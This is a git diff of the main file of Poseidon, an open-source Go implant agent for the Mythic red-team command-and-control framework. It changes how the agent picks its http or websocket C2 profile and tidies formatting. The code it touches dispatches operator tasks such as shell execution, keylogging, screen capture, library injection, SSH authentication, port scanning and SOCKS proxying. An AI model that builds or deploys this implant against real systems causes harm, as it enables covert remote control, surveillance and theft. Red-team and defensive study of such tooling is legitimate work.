@@ -30,10 +30,12 @@ import (
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/ls"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/mkdir"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/mv"
-	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/functions"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/portscan"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/profiles"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/profiles/http"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/profiles/websocket"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/ps"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pwd"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/rm"
@@ -53,6 +55,7 @@ const (
 	EXIT_CODE = 0
 )
 
+var c2Profile = ""
 var taskSlice []structs.Task
 var mu sync.Mutex
 
@@ -142,7 +145,6 @@ func handleResponses(resp []byte, backgroundTasks map[string](chan []byte)) {
 }
 
 func main() {
-
 	// Initialize the  agent and check in
 	currentUser, _ := user.Current()
 	hostname, _ := os.Hostname()
@@ -150,8 +152,18 @@ func main() {
 	currPid := os.Getpid()
 	OperatingSystem := functions.GetOS()
 	arch := functions.GetArchitecture()
-	p := profiles.NewInstance()
-	profile := p.(profiles.Profile)
+
+	// Get C2 Profile
+	var profile profiles.Profile
+	switch c2Profile {
+	case "http":
+		profile = http.New()
+	case "websocket":
+		profile = websocket.New()
+	default:
+		profile = http.New()
+	}
+
 	// Checkin with Apfell. If encryption is enabled, the keyx will occur during this process
 	// fmt.Println(currentUser.Name)
 	resp := profile.CheckIn(currIP, currPid, currentUser.Username, hostname, OperatingSystem, arch)
@@ -159,43 +171,43 @@ func main() {
 	profile.SetApfellID(checkIn.ID)
 
 	tasktypes := map[string]int{
-		"exit":            EXIT_CODE,
-		"shell":           1,
-		"screencapture":   2,
-		"keylog":          3,
-		"download":        4,
-		"upload":          5,
-		"libinject":       6,
-		"ps":              8,
-		"sleep":           9,
-		"cat":             10,
-		"cd":              11,
-		"ls":              12,
-		"python":          13,
-		"jxa":             14,
-		"keys":            15,
-		"triagedirectory": 16,
-		"sshauth":         17,
-		"portscan":        18,
-		"jobs":            21,
-		"jobkill":         22,
-		"cp":              23,
-		"drives":          24,
-		"getuser":         25,
-		"mkdir":           26,
-		"mv":              27,
-		"pwd":             28,
-		"rm":              29,
-		"getenv":          30,
-		"setenv":          31,
-		"unsetenv":        32,
-		"kill":            33,
-		"curl":            34,
-		"xpc":             35,
-		"socks":           36,
-		"listtasks":       37,
+		"exit":              EXIT_CODE,
+		"shell":             1,
+		"screencapture":     2,
+		"keylog":            3,
+		"download":          4,
+		"upload":            5,
+		"libinject":         6,
+		"ps":                8,
+		"sleep":             9,
+		"cat":               10,
+		"cd":                11,
+		"ls":                12,
+		"python":            13,
+		"jxa":               14,
+		"keys":              15,
+		"triagedirectory":   16,
+		"sshauth":           17,
+		"portscan":          18,
+		"jobs":              21,
+		"jobkill":           22,
+		"cp":                23,
+		"drives":            24,
+		"getuser":           25,
+		"mkdir":             26,
+		"mv":                27,
+		"pwd":               28,
+		"rm":                29,
+		"getenv":            30,
+		"setenv":            31,
+		"unsetenv":          32,
+		"kill":              33,
+		"curl":              34,
+		"xpc":               35,
+		"socks":             36,
+		"listtasks":         37,
 		"list_entitlements": 38,
-		"none":            NONE_CODE,
+		"none":              NONE_CODE,
 	}
 
 	// Map used to handle go routines that are waiting for a response from apfell to continue
@@ -230,7 +242,7 @@ func main() {
 				fromMythicSocksChannel <- task.Socks[j]
 			}
 			for j := 0; j < len(task.Tasks); j++ {
-				if tasktypes[task.Tasks[j].Command] == 3 || tasktypes[task.Tasks[j].Command] == 16 || tasktypes[task.Tasks[j].Command] == 18{
+				if tasktypes[task.Tasks[j].Command] == 3 || tasktypes[task.Tasks[j].Command] == 16 || tasktypes[task.Tasks[j].Command] == 18 {
 					// log.Println("Making a job for", task.Command)
 					job := &structs.Job{
 						KillChannel: make(chan int),
@@ -297,8 +309,8 @@ func main() {
 				case 9:
 					// Sleep
 					type Args struct {
-						Interval  int `json:"interval"`
-						Jitter int `json:"jitter"`
+						Interval int `json:"interval"`
+						Jitter   int `json:"jitter"`
 					}
 
 					args := Args{}
@@ -318,14 +330,14 @@ func main() {
 						break
 					}
 					output := ""
-                    if args.Interval >= 0{
-                        profile.SetSleepInterval(args.Interval)
-                        output += "Sleep interval updated\n"
-                    }
-                    if args.Jitter >= 0{
-                        profile.SetSleepJitter(args.Jitter)
-                        output += "Jitter interval updated\n"
-                    }
+					if args.Interval >= 0 {
+						profile.SetSleepInterval(args.Interval)
+						output += "Sleep interval updated\n"
+					}
+					if args.Jitter >= 0 {
+						profile.SetSleepJitter(args.Jitter)
+						output += "Jitter interval updated\n"
+					}
 					resp := structs.Response{}
 					resp.UserOutput = output
 					resp.Completed = true
@@ -549,16 +561,16 @@ func main() {
 						break
 					}
 					resp := structs.Response{}
-                    if args.Action == "start" {
-					    go socks.Run(task.Tasks[j], fromMythicSocksChannel, toMythicSocksChannel)
-                        resp.UserOutput = "Socks started"
-                        resp.Completed = true
-                        resp.TaskID = task.Tasks[j].TaskID
-                    }else{
-                        resp.UserOutput = "Socks stopped"
-                        resp.Completed = true
-                        resp.TaskID = task.Tasks[j].TaskID
-                    }
+					if args.Action == "start" {
+						go socks.Run(task.Tasks[j], fromMythicSocksChannel, toMythicSocksChannel)
+						resp.UserOutput = "Socks started"
+						resp.Completed = true
+						resp.TaskID = task.Tasks[j].TaskID
+					} else {
+						resp.UserOutput = "Socks stopped"
+						resp.Completed = true
+						resp.TaskID = task.Tasks[j].TaskID
+					}
 					encResp, err := json.Marshal(resp)
 					if err != nil {
 						errResp := structs.Response{}
@@ -582,8 +594,8 @@ func main() {
 					go listtasks.Run(task.Tasks[j])
 					break
 				case 38:
-				    go list_entitlements.Run(task.Tasks[j])
-				    break
+					go list_entitlements.Run(task.Tasks[j])
+					break
 				case NONE_CODE:
 					// No tasks, do nothing
 					break
